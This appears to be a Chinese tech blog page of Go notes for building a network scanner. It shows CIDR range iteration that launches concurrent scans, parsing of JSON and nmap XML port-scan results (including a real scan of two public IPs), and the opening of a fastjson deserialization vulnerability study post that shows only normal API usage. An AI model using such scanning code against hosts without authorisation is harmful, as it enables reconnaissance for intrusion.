<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">    age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newPerson 返回一个结构体变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson</span><span class="params">(name <span class="type">string</span>,age <span class="type">int</span>)</span></span> person&#123;</span><br><span class="line">	ret := person&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		age: age,</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 在创建结构体时，返回其内存地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>,&amp;ret)</span><br><span class="line">	<span class="keyword">return</span>  ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// newPerson2 返回一个结构体指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson2</span><span class="params">(name <span class="type">string</span>,age <span class="type">int</span>)</span></span> *person&#123;</span><br><span class="line">	ret := &amp;person&#123;</span><br><span class="line">		name: name,</span><br><span class="line">		age: age,</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 在创建结构体指针时，返回他储存的结构体的地址</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%p\n&quot;</span>,ret)</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    p1 := newPerson(<span class="string">&quot;张三&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, &amp;p1)</span><br><span class="line">    p2 := newPerson2(<span class="string">&quot;李四&quot;</span>, <span class="number">2</span>)<span class="keyword">go</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%p\n&quot;</span>, p2)</span><br><span class="line">	    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson时，返回的结构体变量的地址</span></span><br><span class="line"><span class="number">0xc000096460</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson时，创建的结构体实例的地址</span></span><br><span class="line"><span class="number">0xc000096440</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson2时，返回的结构体指针的地址</span></span><br><span class="line"><span class="number">0xc0000964a0</span></span><br><span class="line"><span class="comment">// 以下是调用构造函数newPerson2时，创建的结构体指针的地址</span></span><br><span class="line"><span class="number">0xc0000964a0</span></span><br></pre></td></tr></table></figure>

<p>如果构造函数返回的是一个结构体变量，在创建结构体实例时，是将构造函数中生成的结构体变量的值传给对应新创建的结构体变量，在上例字中对应的就是 p1，此时内存中就有值相同的两份结构体</p>
<p>如果构造函数返回的是一个结构体指针（newPerson2函数），构造函数最后是将该函数创建的结构体所对应的地址传给了我们创建的实例p2，注意，此时p2是一个结构体指针，这种创建方式，内存中只有一份结构体，对内存的消耗小</p>
<p>当程序很大时，如果都使用结构体传参而非结构体指针，则会产生很多不必要的内存开销，在开发过程中，尽量使用结构体指针来减少内存开销</p>
<h2 id="7、C段遍历"><a href="#7、C段遍历" class="headerlink" title="7、C段遍历"></a>7、C段遍历</h2><p>个人使用github.com&#x2F;3th1nk&#x2F;cidr库</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/3th1nk/cidr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, cdir := <span class="keyword">range</span> r.target.Cdir &#123;</span><br><span class="line">		cdir, _:= cidr.ParseCIDR(cdir)</span><br><span class="line">		<span class="keyword">if</span> err := cdir.ForEachIP(<span class="function"><span class="keyword">func</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">			r.wgscan.Add()</span><br><span class="line">			<span class="keyword">go</span> r.Scan(tempHost)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">    		<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8、读取json文件"><a href="#8、读取json文件" class="headerlink" title="8、读取json文件"></a>8、读取json文件</h2><p>有时候需要读取json文件，这里需要用到json库的json.Unmarshal函数</p>
<p>tips：注意结构体需要成员首字母大写（只有导出的结构体成员才会被编码），首字母小写的结构体元素不会进行赋值</p>
<p>示例代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> portInfo <span class="keyword">struct</span> &#123; </span><br><span class="line">    Port      <span class="type">int</span> </span><br><span class="line">    Proto     <span class="type">string</span></span><br><span class="line">    Status    <span class="type">string</span> </span><br><span class="line">    Reason    <span class="type">string</span></span><br><span class="line">    Ttl       <span class="type">int</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ipInfo <span class="keyword">struct</span> &#123; </span><br><span class="line">    Ip        <span class="type">string</span> </span><br><span class="line">    Timestamp <span class="type">string</span> </span><br><span class="line">    Ports     []portInfo</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	url_file, err2 := os.Open(<span class="string">`test.log`</span>)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open input file error.&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> url_file.Close()</span><br><span class="line">	content, _ := ioutil.ReadAll(url_file)</span><br><span class="line">	content_trim := strings.Trim(<span class="type">string</span>(content), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	<span class="keyword">var</span> result []ipInfo</span><br><span class="line">	err := json.Unmarshal([]<span class="type">byte</span>(content_trim), &amp;result)    <span class="comment">// 通过unmarshal函数对result结构体进行赋值</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;json unmarshal error.&quot;</span>, err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(result[<span class="number">0</span>].Ip)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test.log文件</span><br><span class="line">[</span><br><span class="line">&#123;   <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;101.199.113.197&quot;</span>,   <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1618402120&quot;</span>, <span class="string">&quot;ports&quot;</span>: [ &#123;<span class="string">&quot;port&quot;</span>: <span class="number">80</span>, <span class="string">&quot;proto&quot;</span>: <span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;open&quot;</span>, <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;syn-ack&quot;</span>, <span class="string">&quot;ttl&quot;</span>: <span class="number">53</span>&#125; ] &#125;</span><br><span class="line">,</span><br><span class="line">&#123;   <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;101.199.113.197&quot;</span>,   <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;1618402120&quot;</span>, <span class="string">&quot;ports&quot;</span>: [ &#123;<span class="string">&quot;port&quot;</span>: <span class="number">443</span>, <span class="string">&quot;proto&quot;</span>: <span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;open&quot;</span>, <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;syn-ack&quot;</span>, <span class="string">&quot;ttl&quot;</span>: <span class="number">52</span>&#125; ] &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="9、控制Go编码JSON数据时的行为"><a href="#9、控制Go编码JSON数据时的行为" class="headerlink" title="9、控制Go编码JSON数据时的行为"></a>9、控制Go编码JSON数据时的行为</h2><h4 id="1）自定义json键名"><a href="#1）自定义json键名" class="headerlink" title="1）自定义json键名"></a>1）自定义json键名</h4><p>在编码时，默认使用结构体字段的名字作为JSON对象中的key，如果想自定义键名，需要在结构体声明时在结构体字段标签里可以自定义对应的JSON key</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Address <span class="keyword">struct</span> &#123;</span><br><span class="line">    Type    <span class="type">string</span>  <span class="string">`json:&quot;type&quot;`</span></span><br><span class="line">    City    <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">    Country <span class="type">string</span>  <span class="string">`json:&quot;country&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-编码JSON时忽略掉指定字段"><a href="#2-编码JSON时忽略掉指定字段" class="headerlink" title="2) 编码JSON时忽略掉指定字段"></a>2) 编码JSON时忽略掉指定字段</h4><p>有时候不希望所有的结构体元素都被编码到json中传递给外部接口，所以一些私密字段我们希望能在编码中被忽略掉</p>
<p>一种方式是将结构体元素名首字母小写，但这样就只能在包内使用，但如果我们想让其他包能使用该字段，但又不被编码到json中呢？</p>
<p>解决办法还是使用json的注解，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name    <span class="type">string</span>  <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">    Age     Int     <span class="string">`json:&quot;int&quot;`</span></span><br><span class="line">    IdCard  <span class="type">string</span>  <span class="string">`json:&quot;-&quot;`</span>    <span class="comment">// 不会被编码到json中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在encoding&#x2F;json的源码中也有注释：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Field is ignored by this package.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;-&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;myName&quot;.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;myName&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;myName&quot; and</span></span><br><span class="line"><span class="comment">// the field is omitted from the object if its value is empty,</span></span><br><span class="line"><span class="comment">// as defined above.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;myName,omitempty&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Field appears in JSON as key &quot;Field&quot; (the default), but</span></span><br><span class="line"><span class="comment">// the field is skipped if empty.</span></span><br><span class="line"><span class="comment">// Note the leading comma.</span></span><br><span class="line">Field <span class="type">int</span> <span class="string">`json:&quot;,omitempty&quot;`</span></span><br></pre></td></tr></table></figure>

<p>omitempty意思是当元素数据为空时，在json中省略这个元素</p>
<h2 id="10、xml解析"><a href="#10、xml解析" class="headerlink" title="10、xml解析"></a>10、xml解析</h2><p>在遇到需要解析xml文件时，使用encoding&#x2F;xml库，也需要注意结构体元素名称首字母大写，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/asaskevich/govalidator&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/xml&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">type</span> NmapResult <span class="keyword">struct</span> &#123;</span><br><span class="line">    XMLName    xml.Name <span class="string">`xml:&quot;nmaprun&quot;`</span> </span><br><span class="line">    Host     []hostInfo <span class="string">`xml:&quot;host&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> hostInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;host&quot;`</span></span><br><span class="line">	Address   addressAttr <span class="string">`xml:&quot;address&quot;`</span></span><br><span class="line">	Ports    portInfo  <span class="string">`xml:&quot;ports&quot;`</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> portInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;ports&quot;`</span></span><br><span class="line">	Port    []portAttr     <span class="string">`xml:&quot;port&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> addressAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;address&quot;`</span></span><br><span class="line">	Addr    <span class="type">string</span>  <span class="string">`xml:&quot;addr,attr&quot;`</span></span><br><span class="line">	Addrtype  <span class="type">string</span> <span class="string">`xml:&quot;addrtype,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> stateAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;state&quot;`</span></span><br><span class="line">	State    <span class="type">string</span>  <span class="string">`xml:&quot;state,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> portAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;port&quot;`</span></span><br><span class="line">	Portid    <span class="type">string</span>  <span class="string">`xml:&quot;portid,attr&quot;`</span></span><br><span class="line">	Protocol  <span class="type">string</span>  <span class="string">`xml:&quot;protocol,attr&quot;`</span></span><br><span class="line">	State   stateAttr  <span class="string">`xml:&quot;state&quot;`</span></span><br><span class="line">	Service   serviceAttr  <span class="string">`xml:&quot;service&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> serviceAttr <span class="keyword">struct</span> &#123;</span><br><span class="line">	XMLName    xml.Name <span class="string">`xml:&quot;service&quot;`</span></span><br><span class="line">	Name    <span class="type">string</span>  <span class="string">`xml:&quot;name,attr&quot;`</span></span><br><span class="line">	Product  <span class="type">string</span> <span class="string">`xml:&quot;product,attr&quot;`</span></span><br><span class="line">	Method  <span class="type">string</span> <span class="string">`xml:&quot;method,attr&quot;`</span></span><br><span class="line">	Conf  <span class="type">string</span> <span class="string">`xml:&quot;conf,attr&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	content, err := ioutil.ReadFile(<span class="string">&quot;result1.xml&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;file read error&quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result NmapResult</span><br><span class="line">    fmt.Println(<span class="type">string</span>(content))</span><br><span class="line">    err = xml.Unmarshal(content, &amp;result)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;xml unmarshal error.&quot;</span>,err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(result.Host[<span class="number">0</span>].Ports.Port[<span class="number">0</span>].Service)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE nmaprun&gt;</span><br><span class="line">&lt;?xml-stylesheet href=<span class="string">&quot;file:///usr/bin/../share/nmap/nmap.xsl&quot;</span> <span class="keyword">type</span>=<span class="string">&quot;text/xsl&quot;</span>?&gt;</span><br><span class="line">&lt;!-- Nmap <span class="number">7.60</span> scan initiated Thu Apr <span class="number">15</span> <span class="number">04</span>:<span class="number">43</span>:<span class="number">22</span> <span class="number">2021</span> as: nmap -sV -p <span class="number">80</span>,<span class="number">443</span> -oX result.xml <span class="number">220.181</span><span class="number">.38</span><span class="number">.149</span> <span class="number">111.225</span><span class="number">.218</span><span class="number">.3</span> --&gt;</span><br><span class="line">&lt;nmaprun scanner=<span class="string">&quot;nmap&quot;</span> args=<span class="string">&quot;nmap -sV -p 80,443 -oX result.xml 220.181.38.149 111.225.218.3&quot;</span> start=<span class="string">&quot;1618461802&quot;</span> startstr=<span class="string">&quot;Thu Apr 15 04:43:22 2021&quot;</span> version=<span class="string">&quot;7.60&quot;</span> xmloutputversion=<span class="string">&quot;1.04&quot;</span>&gt;</span><br><span class="line">&lt;scaninfo <span class="keyword">type</span>=<span class="string">&quot;syn&quot;</span> protocol=<span class="string">&quot;tcp&quot;</span> numservices=<span class="string">&quot;2&quot;</span> services=<span class="string">&quot;80,443&quot;</span>/&gt;</span><br><span class="line">&lt;verbose level=<span class="string">&quot;0&quot;</span>/&gt;</span><br><span class="line">&lt;debugging level=<span class="string">&quot;0&quot;</span>/&gt;</span><br><span class="line">&lt;host starttime=<span class="string">&quot;1618461803&quot;</span> endtime=<span class="string">&quot;1618461817&quot;</span>&gt;&lt;status state=<span class="string">&quot;up&quot;</span> reason=<span class="string">&quot;echo-reply&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;</span><br><span class="line">&lt;address addr=<span class="string">&quot;220.181.38.149&quot;</span> addrtype=<span class="string">&quot;ipv4&quot;</span>/&gt;</span><br><span class="line">&lt;hostnames&gt;</span><br><span class="line">&lt;/hostnames&gt;</span><br><span class="line">&lt;ports&gt;&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;80&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;Apache httpd&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:apache:http_server&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;443&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;47&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;Apache httpd&quot;</span> tunnel=<span class="string">&quot;ssl&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:apache:http_server&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;/ports&gt;</span><br><span class="line">&lt;times srtt=<span class="string">&quot;6451&quot;</span> rttvar=<span class="string">&quot;4476&quot;</span> to=<span class="string">&quot;100000&quot;</span>/&gt;</span><br><span class="line">&lt;/host&gt;</span><br><span class="line">&lt;host starttime=<span class="string">&quot;1618461803&quot;</span> endtime=<span class="string">&quot;1618461817&quot;</span>&gt;&lt;status state=<span class="string">&quot;up&quot;</span> reason=<span class="string">&quot;echo-reply&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;</span><br><span class="line">&lt;address addr=<span class="string">&quot;111.225.218.3&quot;</span> addrtype=<span class="string">&quot;ipv4&quot;</span>/&gt;</span><br><span class="line">&lt;hostnames&gt;</span><br><span class="line">&lt;/hostnames&gt;</span><br><span class="line">&lt;ports&gt;&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;80&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;nginx&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:igor_sysoev:nginx&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;port protocol=<span class="string">&quot;tcp&quot;</span> portid=<span class="string">&quot;443&quot;</span>&gt;&lt;state state=<span class="string">&quot;open&quot;</span> reason=<span class="string">&quot;syn-ack&quot;</span> reason_ttl=<span class="string">&quot;48&quot;</span>/&gt;&lt;service name=<span class="string">&quot;http&quot;</span> product=<span class="string">&quot;nginx&quot;</span> tunnel=<span class="string">&quot;ssl&quot;</span> method=<span class="string">&quot;probed&quot;</span> conf=<span class="string">&quot;10&quot;</span>&gt;&lt;cpe&gt;cpe:/a:igor_sysoev:nginx&lt;/cpe&gt;&lt;/service&gt;&lt;/port&gt;</span><br><span class="line">&lt;/ports&gt;</span><br><span class="line">&lt;times srtt=<span class="string">&quot;6792&quot;</span> rttvar=<span class="string">&quot;5344&quot;</span> to=<span class="string">&quot;100000&quot;</span>/&gt;</span><br><span class="line">&lt;/host&gt;</span><br><span class="line">&lt;runstats&gt;&lt;finished time=<span class="string">&quot;1618461817&quot;</span> timestr=<span class="string">&quot;Thu Apr 15 04:43:37 2021&quot;</span> elapsed=<span class="string">&quot;14.36&quot;</span> summary=<span class="string">&quot;Nmap done at Thu Apr 15 04:43:37 2021; 2 IP addresses (2 hosts up) scanned in 14.36 seconds&quot;</span> exit=<span class="string">&quot;success&quot;</span>/&gt;&lt;hosts up=<span class="string">&quot;2&quot;</span> down=<span class="string">&quot;0&quot;</span> total=<span class="string">&quot;2&quot;</span>/&gt;</span><br><span class="line">&lt;/runstats&gt;</span><br><span class="line">&lt;/nmaprun&gt;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-fastjson"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/02/21/fastjson/"
    >fastjson漏洞学习记录</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/21/fastjson/" class="article-date">
  <time datetime="2022-02-21T06:31:27.000Z" itemprop="datePublished">2022-02-21</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="1、fastjson介绍"><a href="#1、fastjson介绍" class="headerlink" title="1、fastjson介绍"></a>1、fastjson介绍</h2><p>​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，简单来说，就是Fastjson通过parseObject&#x2F;parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的</p>
<p>​    网上有很多的介绍以及讲解文章，这里只进行记录一些比较重要的点，讲解文章见参考链接</p>
<h2 id="2、fastjson使用"><a href="#2、fastjson使用" class="headerlink" title="2、fastjson使用"></a>2、fastjson使用</h2><h3 id="1）使用方式"><a href="#1）使用方式" class="headerlink" title="1）使用方式"></a>1）使用方式</h3><p>fastjson主要的反序列化方式为如下3种：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonstr);   <span class="comment">//jsonstr： &#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr, Test.class);   </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br></pre></td></tr></table></figure>
